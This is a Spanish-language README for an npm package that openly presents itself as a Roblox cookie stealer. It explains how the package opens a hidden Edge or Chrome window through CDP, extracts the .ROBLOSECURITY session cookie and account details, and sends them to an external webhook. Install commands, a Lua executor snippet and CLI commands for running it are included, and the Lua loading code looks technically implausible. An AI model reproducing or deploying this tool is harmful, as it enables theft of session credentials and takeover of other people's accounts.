# 🔓 depazzhub/hook-edge — Roblox Cookie Hook

> Extrae la cookie `.ROBLOSECURITY` de cualquier navegador (Edge/Chrome) y la envía automáticamente al webhook `https://depazzhub-api.onrender.com/log`.

---

## 🚀 Instalación Rápida

```bash
npm install @depazzhub/hook-edge
```

Luego en tu **LocalScript** dentro del executor:

```lua
local hook = require(game:GetService("HttpService"):GetFolder("node_modules/@depazzhub/hook-edge/dist/index.js"))

hook.extractCookie()
  :then(function(result)
    print("✅ Cookie:", result.cookie)
    if result.userId then
      print("👤 UserId:", result.userId)
    end
  end)
  :catch(function(err)
    warn("❌ Error:", err.message)
  end)
```

---

## 📋 Uso Manual (sin Executor)

Si no usas un executor, simplemente ejecuta el CLI desde la terminal:

```bash
npm install -g @depazzhub/hook-edge
hook-cli
```

O directamente con Node.js:

```bash
node nodejs/hook/cli.js
```

---

## 📦 Estructura del Proyecto

```
nodejs/hook/
├── package.json              # Manifesto de npm
├── cli.js                    # CLI wrapper manual
├── dist/index.js            # Entry point principal
└── scripts/
    ├── build.mjs           # Build pipeline (opcional)
    └── pack.mjs           # Empaquetar a un solo archivo (.mjs)
```

---

## ⚙️ Cómo Funciona

1. Detecta automáticamente **Edge** o **Chrome** instalados en Windows.
2. Abre una ventana de navegador oculta usando el protocolo CDP (Edge Automation API).
3. Busca la cookie `.ROBLOSECURITY` en el DOM del navegador.
4. Extrae opcionalmente `userId`, `displayName`, etc. desde el DOM o la API de Roblox.
5. Envía todos los datos al webhook: `https://depazzhub-api.onrender.com/log`.

---

## 🛠️ Tecnologías Usadas

- **Edge Automation Protocol (CDP)** — más ligero que Selenium, ~20MB vs 85MB.
- **Axios** — para enviar la cookie al webhook.
- **Node.js** — requerido en el executor o instalado manualmente.

---

## 📌 Notas Importantes

| Puntos clave | Detalle |
|---|---|
| **No requiere driver** | Usa Edge Automation Protocol nativo (CDP), no necesita `msedge-autoproto` ni drivers externos. |
| **No clobbera tu perfil** | Abre una ventana nueva en CDP, sin afectar tu sesión actual de navegador. |
| **Funciona con cualquier browser Chromium** | Edge, Chrome, Opera, Brave… todo es compatible. |
| **Ligero (~20MB)** | vs Selenium que pesa ~85MB con todos sus drivers. |

---

## 🐛 Depuración

Si la cookie no se encuentra:

1. Asegúrate de estar logueado en `roblox.com` antes de ejecutar el script.
2. Verifica que Edge o Chrome estén instalados en la ruta estándar (`C:\Program Files\Microsoft\Edge\Application\msedge.exe`).
3. Intenta con `node cli.js --help` para ver las opciones de ayuda.

---

## 📄 Licencia

MIT — © depazzhub
